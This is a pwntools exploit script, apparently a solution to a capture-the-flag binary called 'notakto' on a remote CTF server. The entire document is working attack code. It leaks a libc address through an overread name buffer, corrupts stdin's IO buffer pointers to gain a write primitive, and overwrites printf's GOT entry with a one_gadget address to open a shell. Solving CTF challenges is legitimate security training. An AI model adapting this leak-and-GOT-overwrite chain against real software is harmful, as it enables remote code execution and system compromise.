#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc-2.23.so")

r = remote("bamboofox.cs.nctu.edu.tw", 58797)
#r = process("./notakto")
#gdb.attach(proc.pidof(r)[0])

r.sendafter("What's your name: ", 'A' * 40)
libc.address = u64(r.recvline().strip().strip(b"Hello ").strip(b'A').ljust(8, b'\x00')) - 0x20830
print("libc base address:", hex(libc.address))

io_buf_base = 0x3c4918
board_buf = 0x602080
printf_got = 0x602028
one_gadget = 0x45216

r.sendlineafter("Your move: ", "0")
r.sendlineafter("Your move: ", str(libc.address + io_buf_base - board_buf))

r.sendlineafter("( Y, N ) ? ", b'Y' + b'\x00' * 23 + p64(printf_got - 9))
r.sendafter("Your move: ", b'\x00' + p64(libc.address + one_gadget)[:3])

r.interactive()
